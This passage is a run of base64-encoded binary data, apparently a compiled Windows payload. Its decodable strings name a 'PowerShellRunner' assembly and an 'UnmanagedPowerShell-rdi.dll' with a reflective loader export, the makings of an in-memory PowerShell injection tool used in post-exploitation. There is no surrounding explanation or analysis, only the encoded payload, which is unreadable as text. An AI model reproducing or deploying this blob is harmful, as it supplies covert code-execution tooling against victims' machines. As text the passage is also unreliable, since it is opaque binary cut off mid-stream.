GgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF9UAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAyACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgWVSAGUAYQBkAEwAaQBuAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBgVIAZQBhAGQATABpAG4AZQBBAHMAUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAFJRgBsAHUAcwBoAEkAbgBwAHUAdABCAHUAZgBmAGUAcgAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAEtHAGUAdABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABBSwBlAHkAQQB2AGEAaQBsAGEAYgBsAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAACBY1IAZQBhAGQASwBlAHkAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlA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